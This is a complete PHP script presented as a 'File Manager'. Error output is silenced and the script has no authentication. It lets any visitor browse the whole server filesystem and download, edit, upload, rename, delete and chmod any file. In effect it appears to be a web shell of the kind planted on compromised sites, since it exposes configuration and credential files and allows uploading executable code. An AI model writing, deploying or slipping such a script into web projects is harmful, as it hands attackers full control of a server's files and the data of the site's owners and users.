<?php
@set_time_limit(0);
@error_reporting(0);

$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$path = realpath($path);

function h($s) { return htmlspecialchars($s, ENT_QUOTES); }
function formatBytes($size) {
    if($size < 1024) return $size.' B';
    $units = ['KB','MB','GB','TB'];
    for($i = 0; $size >= 1024 && $i < 3; $i++) $size /= 1024;
    return round($size, 2).' '.$units[$i];
}

function formatDate($timestamp) {
    return date('M j, Y H:i', $timestamp);
}

function formatPermissions($perms) {
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';
    
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    
    return substr($info, 1);
}

// Handle navigation
if(isset($_GET['cd'])) {
    $new = realpath($path.'/'.$_GET['cd']);
    if(is_dir($new)) { header("Location: ?path=".urlencode($new)); exit; }
}

// Handle file operations
if(isset($_GET['del'])) {
    $target = realpath($path.'/'.$_GET['del']);
    if(is_file($target)) unlink($target);
    if(is_dir($target)) @rmdir($target);
    header("Location: ?path=".urlencode($path)); exit;
}

if(isset($_GET['dl'])) {
    $target = realpath($path.'/'.$_GET['dl']);
    if(is_file($target)) {
        header("Content-Type: application/octet-stream");
        header("Content-Disposition: attachment; filename=\"".basename($target)."\"");
        readfile($target); exit;
    }
}

// File editor
if(isset($_GET['edit'])) {
    $file = realpath($path.'/'.$_GET['edit']);
    if($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content']);
        header("Location: ?path=".urlencode($path)); exit;
    }
    
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>".h(basename($file))."</title>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e2e8f0;height:100vh;display:flex;flex-direction:column}
.header{background:linear-gradient(135deg, #1e293b 0%, #334155 100%);padding:16px 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #334155;box-shadow:0 2px 10px rgba(0,0,0,0.3)}
.title{color:#f1f5f9;font-size:18px;font-weight:600;display:flex;align-items:center;gap:12px}
.title i{color:#38bdf8}
.actions{display:flex;gap:12px}
.btn{background:linear-gradient(135deg, #0ea5e9 0%, #0284c7 100%);color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:500;text-decoration:none;display:flex;align-items:center;gap:8px;transition:all 0.2s ease;box-shadow:0 2px 8px rgba(14,165,233,0.3)}
.btn:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(14,165,233,0.4);background:linear-gradient(135deg, #0284c7 0%, #0369a1 100%)}
.btn-secondary{background:linear-gradient(135deg, #475569 0%, #64748b 100%);color:#f1f5f9;box-shadow:0 2px 8px rgba(71,85,105,0.3)}
.btn-secondary:hover{background:linear-gradient(135deg, #64748b 0%, #94a3b8 100%);box-shadow:0 4px 16px rgba(71,85,105,0.4)}
.editor{flex:1;width:100%;background:#0a0a0a;color:#e2e8f0;border:none;padding:24px;font-family:'Fira Code','JetBrains Mono','Courier New',monospace;font-size:14px;line-height:1.6;resize:none;outline:none;tab-size:4}
.status{background:linear-gradient(135deg, #1e293b 0%, #334155 100%);padding:12px 24px;color:#94a3b8;font-size:13px;display:flex;justify-content:space-between;border-top:1px solid #334155;box-shadow:0 -2px 10px rgba(0,0,0,0.2)}
@media(max-width:768px){
.header{padding:12px 16px;flex-direction:column;gap:12px}
.title{font-size:16px}
.actions{width:100%;justify-content:center}
.btn{padding:8px 16px;font-size:13px}
.editor{padding:16px;font-size:13px}
.status{padding:8px 16px;font-size:12px;flex-direction:column;gap:4px}
}
</style></head><body>
<form method='POST' style='height:100%;display:flex;flex-direction:column'>
<div class='header'>
<div class='title'><i class='fas fa-code'></i>".h(basename($file))."</div>
<div class='actions'>
<button class='btn' type='submit'><i class='fas fa-save'></i>Save Changes</button>
<a href='?path=".urlencode(dirname($file))."' class='btn btn-secondary'><i class='fas fa-arrow-left'></i>Back</a>
</div></div>
<textarea name='content' class='editor' placeholder='Start typing...'>".h(file_get_contents($file))."</textarea>
<div class='status'>
<span><i class='fas fa-file-code'></i> ".h(basename($file))." • ".formatBytes(filesize($file))."</span>
<span><i class='fas fa-circle' style='color:#10b981'></i> Ready</span>
</div>
</form></body></html>";
    exit;
}

// Handle permissions change
if(isset($_GET['chmod'])) {
    $file = realpath($path.'/'.$_GET['chmod']);
    if($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newPerms = octdec($_POST['permissions']);
        chmod($file, $newPerms);
        header("Location: ?path=".urlencode($path)); exit;
    }
    $currentPerms = substr(sprintf('%o', fileperms($file)), -3);
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.form{background:linear-gradient(135deg, #1e293b 0%, #334155 100%);padding:32px;border-radius:16px;width:100%;max-width:500px;box-shadow:0 20px 50px rgba(0,0,0,0.5);border:1px solid #334155}
.title{color:#f1f5f9;margin-bottom:24px;font-size:20px;font-weight:600;display:flex;align-items:center;gap:12px}
.title i{color:#38bdf8}
.perm-group{margin-bottom:20px;padding:16px;background:rgba(15,23,42,0.5);border-radius:12px;border:1px solid #334155}
.perm-title{font-size:15px;font-weight:600;margin-bottom:12px;color:#cbd5e1;display:flex;align-items:center;gap:8px}
.perm-title i{color:#38bdf8}
.checkboxes{display:flex;gap:20px;flex-wrap:wrap}
.checkbox{display:flex;align-items:center;gap:8px;font-size:14px;cursor:pointer;padding:8px;border-radius:8px;transition:background 0.2s ease}
.checkbox:hover{background:rgba(59,130,246,0.1)}
.checkbox input[type=checkbox]{width:18px;height:18px;accent-color:#0ea5e9;cursor:pointer}
.octal-input{width:100%;padding:16px;background:rgba(15,23,42,0.8);border:2px solid #334155;border-radius:12px;color:#f1f5f9;font-size:16px;margin:20px 0;text-align:center;font-family:'Fira Code',monospace;font-weight:500;transition:border-color 0.2s ease}
.octal-input:focus{outline:none;border-color:#0ea5e9;box-shadow:0 0 0 3px rgba(14,165,233,0.1)}
.current{background:rgba(15,23,42,0.8);padding:16px;border-radius:12px;margin-bottom:20px;font-size:14px;color:#94a3b8;border:1px solid #334155;display:flex;align-items:center;gap:12px}
.current i{color:#10b981}
.btn{background:linear-gradient(135deg, #0ea5e9 0%, #0284c7 100%);color:#fff;border:none;padding:12px 24px;border-radius:10px;cursor:pointer;font-size:14px;font-weight:500;margin-right:12px;transition:all 0.2s ease;box-shadow:0 4px 12px rgba(14,165,233,0.3)}
.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(14,165,233,0.4)}
.btn-cancel{background:linear-gradient(135deg, #475569 0%, #64748b 100%);color:#f1f5f9;text-decoration:none;box-shadow:0 4px 12px rgba(71,85,105,0.3)}
.btn-cancel:hover{background:linear-gradient(135deg, #64748b 0%, #94a3b8 100%)}
@media(max-width:768px){
.form{padding:24px;margin:20px}
.title{font-size:18px}
.checkboxes{gap:12px}
.checkbox{font-size:13px;padding:6px}
.btn{padding:10px 20px;font-size:13px;margin-right:8px}
}
</style></head><body>
<div class='form'>
<div class='title'><i class='fas fa-shield-alt'></i>Edit Permissions</div>
<div class='current'><i class='fas fa-info-circle'></i>Current: ".formatPermissions(fileperms($file))." ($currentPerms)</div>
<form method='POST'>
<div class='perm-group'>
<div class='perm-title'><i class='fas fa-user'></i>Owner</div>
<div class='checkboxes'>
<label class='checkbox'><input type='checkbox' name='owner_r' ".($currentPerms[0]&4?'checked':'')."> Read</label>
<label class='checkbox'><input type='checkbox' name='owner_w' ".($currentPerms[0]&2?'checked':'')."> Write</label>
<label class='checkbox'><input type='checkbox' name='owner_x' ".($currentPerms[0]&1?'checked':'')."> Execute</label>
</div></div>
<div class='perm-group'>
<div class='perm-title'><i class='fas fa-users'></i>Group</div>
<div class='checkboxes'>
<label class='checkbox'><input type='checkbox' name='group_r' ".($currentPerms[1]&4?'checked':'')."> Read</label>
<label class='checkbox'><input type='checkbox' name='group_w' ".($currentPerms[1]&2?'checked':'')."> Write</label>
<label class='checkbox'><input type='checkbox' name='group_x' ".($currentPerms[1]&1?'checked':'')."> Execute</label>
</div></div>
<div class='perm-group'>
<div class='perm-title'><i class='fas fa-globe'></i>Others</div>
<div class='checkboxes'>
<label class='checkbox'><input type='checkbox' name='other_r' ".($currentPerms[2]&4?'checked':'')."> Read</label>
<label class='checkbox'><input type='checkbox' name='other_w' ".($currentPerms[2]&2?'checked':'')."> Write</label>
<label class='checkbox'><input type='checkbox' name='other_x' ".($currentPerms[2]&1?'checked':'')."> Execute</label>
</div></div>
<input type='text' name='permissions' class='octal-input' value='$currentPerms' placeholder='755' pattern='[0-7]{3}' title='3-digit octal permissions'>
<button class='btn' type='submit'><i class='fas fa-check'></i> Apply Changes</button>
<a href='?path=".urlencode($path)."' class='btn-cancel btn'><i class='fas fa-times'></i> Cancel</a>
</form>
<script>
const checkboxes = document.querySelectorAll('input[type=checkbox]');
const octalInput = document.querySelector('.octal-input');
function updateOctal() {
    let owner = 0, group = 0, other = 0;
    if(document.querySelector('[name=owner_r]').checked) owner += 4;
    if(document.querySelector('[name=owner_w]').checked) owner += 2;
    if(document.querySelector('[name=owner_x]').checked) owner += 1;
    if(document.querySelector('[name=group_r]').checked) group += 4;
    if(document.querySelector('[name=group_w]').checked) group += 2;
    if(document.querySelector('[name=group_x]').checked) group += 1;
    if(document.querySelector('[name=other_r]').checked) other += 4;
    if(document.querySelector('[name=other_w]').checked) other += 2;
    if(document.querySelector('[name=other_x]').checked) other += 1;
    octalInput.value = owner.toString() + group.toString() + other.toString();
}
checkboxes.forEach(cb => cb.addEventListener('change', updateOctal));
</script>
</div></body></html>";
    exit;
}

if(isset($_GET['rename'])) {
    $old = realpath($path.'/'.$_GET['rename']);
    if($_SERVER['REQUEST_METHOD'] === 'POST') {
        rename($old, $path.'/'.$_POST['newname']);
        header("Location: ?path=".urlencode($path)); exit;
    }
    echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e2e8f0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.form{background:linear-gradient(135deg, #1e293b 0%, #334155 100%);padding:32px;border-radius:16px;width:100%;max-width:450px;box-shadow:0 20px 50px rgba(0,0,0,0.5);border:1px solid #334155}
.title{color:#f1f5f9;margin-bottom:20px;font-size:20px;font-weight:600;display:flex;align-items:center;gap:12px}
.title i{color:#38bdf8}
input{width:100%;padding:16px;background:rgba(15,23,42,0.8);border:2px solid #334155;border-radius:12px;color:#f1f5f9;font-size:16px;margin-bottom:20px;transition:border-color 0.2s ease}
input:focus{outline:none;border-color:#0ea5e9;box-shadow:0 0 0 3px rgba(14,165,233,0.1)}
.btn{background:linear-gradient(135deg, #0ea5e9 0%, #0284c7 100%);color:#fff;border:none;padding:12px 24px;border-radius:10px;cursor:pointer;font-size:14px;font-weight:500;margin-right:12px;transition:all 0.2s ease;box-shadow:0 4px 12px rgba(14,165,233,0.3)}
.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(14,165,233,0.4)}
.btn-cancel{background:linear-gradient(135deg, #475569 0%, #64748b 100%);color:#f1f5f9;text-decoration:none;box-shadow:0 4px 12px rgba(71,85,105,0.3)}
.btn-cancel:hover{background:linear-gradient(135deg, #64748b 0%, #94a3b8 100%)}
@media(max-width:768px){
.form{padding:24px;margin:20px}
.btn{padding:10px 20px;font-size:13px}
}
</style></head><body>
<div class='form'>
<div class='title'><i class='fas fa-edit'></i>Rename Item</div>
<form method='POST'>
<input type='text' name='newname' value='".h(basename($old))."' required autofocus>
<button class='btn' type='submit'><i class='fas fa-check'></i> Rename</button>
<a href='?path=".urlencode($path)."' class='btn-cancel btn'><i class='fas fa-times'></i> Cancel</a>
</form></div></body></html>";
    exit;
}

// Handle uploads and new items
if($_SERVER['REQUEST_METHOD'] === 'POST') {
    if(isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.basename($_FILES['file']['name']));
    }
    if(isset($_POST['newfolder'])) mkdir($path.'/'.$_POST['newfolder']);
    if(isset($_POST['newfile'])) file_put_contents($path.'/'.$_POST['newfile'], "");
    header("Location: ?path=".urlencode($path)); exit;
}

// Get files and folders
$items = scandir($path);
$dirs = $files = [];
foreach($items as $item) {
    if($item === "." || $item === "..") continue;
    $full = $path.'/'.$item;
    if(is_dir($full)) $dirs[] = $item; else $files[] = $item;
}
sort($dirs); sort($files);

// File icons
function getIcon($item, $isDir) {
    if($isDir) return 'fas fa-folder';
    $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
    $icons = [
        'php'=>'fab fa-php', 'js'=>'fab fa-js', 'html'=>'fab fa-html5', 'css'=>'fab fa-css3',
        'json'=>'fas fa-code', 'xml'=>'fas fa-code', 'txt'=>'fas fa-file-alt', 'md'=>'fab fa-markdown',
        'jpg'=>'fas fa-image', 'jpeg'=>'fas fa-image', 'png'=>'fas fa-image', 'gif'=>'fas fa-image',
        'pdf'=>'fas fa-file-pdf', 'zip'=>'fas fa-file-archive', 'sql'=>'fas fa-database'
    ];
    return isset($icons[$ext]) ? $icons[$ext] : 'fas fa-file';
}

echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>
<title>File Manager</title>
<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css' rel='stylesheet'>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:#e2e8f0;line-height:1.6;min-height:100vh}
.container{max-width:1400px;margin:0 auto;padding:20px}
.header{background:linear-gradient(135deg, #1e293b 0%, #334155 100%);padding:24px;border-radius:16px;margin-bottom:24px;box-shadow:0 8px 32px rgba(0,0,0,0.3);border:1px solid #334155}
.header-content{display:flex;align-items:center;gap:16px;margin-bottom:12px}
.header-icon{width:48px;height:48px;background:linear-gradient(135deg, #0ea5e9 0%, #0284c7 100%);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;color:#fff;box-shadow:0 4px 12px rgba(14,165,233,0.3)}
.header h1{font-size:24px;font-weight:700;color:#f1f5f9;margin:0}
.subtitle{color:#94a3b8;font-size:14px;margin-top:4px}
.breadcrumb{background:rgba(15,23,42,0.5);padding:12px 16px;border-radius:10px;font-size:14px;border:1px solid #334155}
.breadcrumb a{color:#38bdf8;text-decoration:none;transition:color 0.2s ease}
.breadcrumb a:hover{color:#0ea5e9;text-decoration:underline}
.breadcrumb-separator{color:#64748b;margin:0 8px}
.toolbar{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:16px;margin-bottom:24px}
.tool{background:linear-gradient(135deg, #1e293b 0%, #334155 100%);padding:20px;border-radius:12px;display:flex;align-items:center;gap:12px;border:1px solid #334155;box-shadow:0 4px 16px rgba(0,0,0,0.1);transition:transform 0.2s ease}
.tool:hover{transform:translateY(-2px)}
.tool-icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:16px;color:#fff}
.tool-upload .tool-icon{background:linear-gradient(135deg, #10b981 0%, #059669 100%)}
.tool-folder .tool-icon{background:linear-gradient(135deg, #f59e0b 0%, #d97706 100%)}
.tool-file .tool-icon{background:linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%)}
.tool input{flex:1;background:rgba(15,23,42,0.8);border:2px solid #475569;border-radius:10px;padding:12px;color:#f1f5f9;font-size:14px;transition:border-color 0.2s ease}
.tool input:focus{outline:none;border-color:#0ea5e9;box-shadow:0 0 0 3px rgba(14,165,233,0.1)}
.btn{background:linear-gradient(135deg, #0ea5e9 0%, #0284c7 100%);color:#fff;border:none;padding:10px 20px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:500;white-space:nowrap;transition:all 0.2s ease;box-shadow:0 2px 8px rgba(14,165,233,0.3)}
.btn:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(14,165,233,0.4)}
.files{background:linear-gradient(135deg, #1e293b 0%, #334155 100%);border-radius:16px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,0.3);border:1px solid #334155}
.file-header{background:rgba(15,23,42,0.8);padding:16px 20px;display:grid;grid-template-columns:1fr 100px 120px 160px 140px 160px;gap:16px;font-size:14px;font-weight:600;color:#94a3b8;border-bottom:1px solid #334155}
.file-row{padding:16px 20px;display:grid;grid-template-columns:1fr 100px 120px 160px 140px 160px;gap:16px;align-items:center;border-bottom:1px solid rgba(51,65,85,0.3);transition:all 0.2s ease;cursor:pointer}
.file-row:hover{background:rgba(59,130,246,0.05);transform:translateX(4px)}
.file-row:last-child{border-bottom:none}
.file-name{display:flex;align-items:center;gap:12px;color:#f1f5f9;text-decoration:none;font-weight:500;transition:color 0.2s ease}
.file-name:hover{color:#38bdf8}
.file-name i{width:20px;font-size:16px}
.folder-icon{color:#fbbf24 !important}
.file-icon{color:#94a3b8}
.file-type{background:linear-gradient(135deg, #475569 0%, #64748b 100%);color:#f1f5f9;padding:4px 12px;border-radius:20px;font-size:12px;text-transform:uppercase;font-weight:600;text-align:center}
.dir-type{background:linear-gradient(135deg, #0ea5e9 0%, #0284c7 100%);color:#fff}
.file-size{color:#94a3b8;font-size:14px;font-weight:500}
.file-actions{display:flex;gap:8px;justify-content:center}
.file-actions a{color:#94a3b8;font-size:14px;text-decoration:none;padding:8px;border-radius:8px;transition:all 0.2s ease;width:32px;height:32px;display:flex;align-items:center;justify-content:center}
.file-actions a:hover{color:#38bdf8;background:rgba(56,189,248,0.1);transform:translateY(-1px)}
.file-date{color:#94a3b8;font-size:13px}
.file-perms{color:#94a3b8;font-size:12px;font-family:'Fira Code',monospace;cursor:pointer;padding:6px 10px;background:rgba(15,23,42,0.6);border-radius:6px;transition:all 0.2s ease;border:1px solid #334155}
.file-perms:hover{color:#38bdf8;background:rgba(56,189,248,0.1);border-color:#0ea5e9}
.empty-state{text-align:center;padding:60px 20px;color:#64748b}
.empty-state i{font-size:48px;margin-bottom:16px;color:#475569}
.empty-state h3{font-size:18px;margin-bottom:8px;color:#94a3b8}
.mobile-file-card{display:none;background:rgba(15,23,42,0.3);margin-bottom:12px;border-radius:12px;padding:16px;border:1px solid #334155;transition:all 0.2s ease}
.mobile-file-card:hover{background:rgba(59,130,246,0.05);border-color:#0ea5e9}
.mobile-file-info{display:flex;align-items:center;gap:12px;margin-bottom:12px}
.mobile-file-details{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px;font-size:13px}
.mobile-file-details > div{color:#94a3b8}
.mobile-file-details strong{color:#f1f5f9;display:block;margin-top:2px}
.mobile-actions{display:flex;gap:8px;flex-wrap:wrap}
@media(max-width:1024px){
.container{padding:16px}
.toolbar{grid-template-columns:1fr}
.tool{padding:16px}
.files{margin:0 -4px}
.file-header{grid-template-columns:1fr 80px 100px 120px;gap:12px;padding:12px 16px}
.file-row{grid-template-columns:1fr 80px 100px 120px;gap:12px;padding:12px 16px}
.file-actions{gap:6px}
.file-actions a{width:28px;height:28px;font-size:12px}
}
@media(max-width:768px){
.header{padding:20px}
.header-content{flex-direction:column;text-align:center;gap:12px}
.header h1{font-size:20px}
.breadcrumb{font-size:13px;padding:10px 12px}
.toolbar{grid-template-columns:1fr;gap:12px}
.tool{padding:16px;flex-direction:column;gap:12px}
.tool input{width:100%}
.btn{padding:10px 16px;font-size:13px}
.file-header{display:none}
.file-row{display:none}
.mobile-file-card{display:block}
.files{background:transparent;box-shadow:none;border:none}
}
@media(max-width:480px){
.container{padding:12px}
.header{padding:16px}
.header h1{font-size:18px}
.breadcrumb{padding:8px 12px;font-size:12px}
.tool{padding:12px}
.mobile-file-info{gap:10px}
.mobile-file-details{grid-template-columns:1fr;gap:8px}
.mobile-actions a{padding:6px 12px;font-size:12px;border-radius:6px}
}
</style></head><body>
<div class='container'>
<div class='header'>
<div class='header-content'>
<div class='header-icon'><i class='fas fa-hdd'></i></div>
<div>
<h1>File Manager</h1>
<div class='subtitle'>Navigate and manage your files with ease</div>
</div>
</div>
<div class='breadcrumb'>";

$parts = explode(DIRECTORY_SEPARATOR, $path);
$crumb = '';
foreach($parts as $i => $part) {
    if($part === '') continue;
    $crumb .= DIRECTORY_SEPARATOR.$part;
    if($i === count($parts)-1) {
        echo "<strong>".h($part)."</strong>";
    } else {
        echo "<a href='?path=".urlencode($crumb)."'>".h($part)."</a><span class='breadcrumb-separator'>/</span>";
    }
}

echo "</div></div>
<div class='toolbar'>
<form method='POST' enctype='multipart/form-data' class='tool tool-upload'>
<div class='tool-icon'><i class='fas fa-upload'></i></div>
<input type='file' name='file' required>
<button class='btn' type='submit'><i class='fas fa-upload'></i> Upload</button>
</form>
<form method='POST' class='tool tool-folder'>
<div class='tool-icon'><i class='fas fa-folder-plus'></i></div>
<input type='text' name='newfolder' placeholder='Enter folder name' required>
<button class='btn' type='submit'><i class='fas fa-plus'></i> Create</button>
</form>
<form method='POST' class='tool tool-file'>
<div class='tool-icon'><i class='fas fa-file-plus'></i></div>
<input type='text' name='newfile' placeholder='Enter file name' required>
<button class='btn' type='submit'><i class='fas fa-plus'></i> Create</button>
</form>
</div>
<div class='files'>";

if(empty($dirs) && empty($files)) {
    echo "<div class='empty-state'>
    <i class='fas fa-folder-open'></i>
    <h3>This folder is empty</h3>
    <p>Upload files or create new folders to get started</p>
    </div>";
} else {
    echo "<div class='file-header'>
    <div><i class='fas fa-sort'></i> Name</div>
    <div><i class='fas fa-tag'></i> Type</div>
    <div><i class='fas fa-weight-hanging'></i> Size</div>
    <div><i class='fas fa-calendar'></i> Modified</div>
    <div><i class='fas fa-shield-alt'></i> Permissions</div>
    <div><i class='fas fa-cogs'></i> Actions</div>
    </div>";

    // Display directories
    foreach($dirs as $item) {
        $full = $path.'/'.$item;
        $modified = formatDate(filemtime($full));
        $perms = formatPermissions(fileperms($full));
        echo "<div class='file-row'>
        <a href='?path=".urlencode($full)."' class='file-name'>
        <i class='".getIcon($item, true)." folder-icon'></i>".h($item)."</a>
        <div class='file-type dir-type'>FOLDER</div>
        <div class='file-size'>—</div>
        <div class='file-date'>$modified</div>
        <a href='?path=".urlencode($path)."&chmod=".urlencode($item)."' class='file-perms' title='Click to edit permissions'>$perms</a>
        <div class='file-actions'>
        <a href='?path=".urlencode($path)."&rename=".urlencode($item)."' title='Rename'><i class='fas fa-edit'></i></a>
        <a href='?path=".urlencode($path)."&del=".urlencode($item)."' onclick='return confirm(\"Delete this folder?\")' title='Delete'><i class='fas fa-trash'></i></a>
        </div></div>";
        
        // Mobile card version
        echo "<div class='mobile-file-card'>
        <div class='mobile-file-info'>
        <i class='".getIcon($item, true)." folder-icon' style='font-size:20px'></i>
        <div>
        <strong>".h($item)."</strong>
        <div style='color:#94a3b8;font-size:12px;margin-top:2px'>Folder</div>
        </div>
        </div>
        <div class='mobile-file-details'>
        <div>Modified: <strong>$modified</strong></div>
        <div>Permissions: <strong>$perms</strong></div>
        </div>
        <div class='mobile-actions'>
        <a href='?path=".urlencode($full)."' class='btn' style='margin:0'><i class='fas fa-folder-open'></i> Open</a>
        <a href='?path=".urlencode($path)."&rename=".urlencode($item)."' class='btn btn-secondary' style='margin:0'><i class='fas fa-edit'></i> Rename</a>
        <a href='?path=".urlencode($path)."&chmod=".urlencode($item)."' class='btn btn-secondary' style='margin:0'><i class='fas fa-shield-alt'></i> Permissions</a>
        <a href='?path=".urlencode($path)."&del=".urlencode($item)."' onclick='return confirm(\"Delete?\")' class='btn' style='background:#dc2626;margin:0'><i class='fas fa-trash'></i> Delete</a>
        </div></div>";
    }

    // Display files
    foreach($files as $item) {
        $full = $path.'/'.$item;
        $size = filesize($full);
        $modified = formatDate(filemtime($full));
        $perms = formatPermissions(fileperms($full));
        $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
        echo "<div class='file-row'>
        <div class='file-name'><i class='".getIcon($item, false)." file-icon'></i>".h($item)."</div>
        <div class='file-type'>".strtoupper($ext ?: 'FILE')."</div>
        <div class='file-size'>".formatBytes($size)."</div>
        <div class='file-date'>$modified</div>
        <a href='?path=".urlencode($path)."&chmod=".urlencode($item)."' class='file-perms' title='Click to edit permissions'>$perms</a>
        <div class='file-actions'>
        <a href='?path=".urlencode($path)."&dl=".urlencode($item)."' title='Download'><i class='fas fa-download'></i></a>
        <a href='?path=".urlencode($path)."&edit=".urlencode($item)."' title='Edit'><i class='fas fa-edit'></i></a>
        <a href='?path=".urlencode($path)."&rename=".urlencode($item)."' title='Rename'><i class='fas fa-pen'></i></a>
        <a href='?path=".urlencode($path)."&del=".urlencode($item)."' onclick='return confirm(\"Delete this file?\")' title='Delete'><i class='fas fa-trash'></i></a>
        </div></div>";
        
        // Mobile card version
        echo "<div class='mobile-file-card'>
        <div class='mobile-file-info'>
        <i class='".getIcon($item, false)." file-icon' style='font-size:20px'></i>
        <div>
        <strong>".h($item)."</strong>
        <div style='color:#94a3b8;font-size:12px;margin-top:2px'>".strtoupper($ext ?: 'FILE')." • ".formatBytes($size)."</div>
        </div>
        </div>
        <div class='mobile-file-details'>
        <div>Modified: <strong>$modified</strong></div>
        <div>Permissions: <strong>$perms</strong></div>
        </div>
        <div class='mobile-actions'>
        <a href='?path=".urlencode($path)."&dl=".urlencode($item)."' class='btn' style='margin:0'><i class='fas fa-download'></i> Download</a>
        <a href='?path=".urlencode($path)."&edit=".urlencode($item)."' class='btn btn-secondary' style='margin:0'><i class='fas fa-edit'></i> Edit</a>
        <a href='?path=".urlencode($path)."&rename=".urlencode($item)."' class='btn btn-secondary' style='margin:0'><i class='fas fa-pen'></i> Rename</a>
        <a href='?path=".urlencode($path)."&chmod=".urlencode($item)."' class='btn btn-secondary' style='margin:0'><i class='fas fa-shield-alt'></i> Permissions</a>
        <a href='?path=".urlencode($path)."&del=".urlencode($item)."' onclick='return confirm(\"Delete?\")' class='btn' style='background:#dc2626;margin:0'><i class='fas fa-trash'></i> Delete</a>
        </div></div>";
    }
}

echo "</div></div></body></html>";
?>
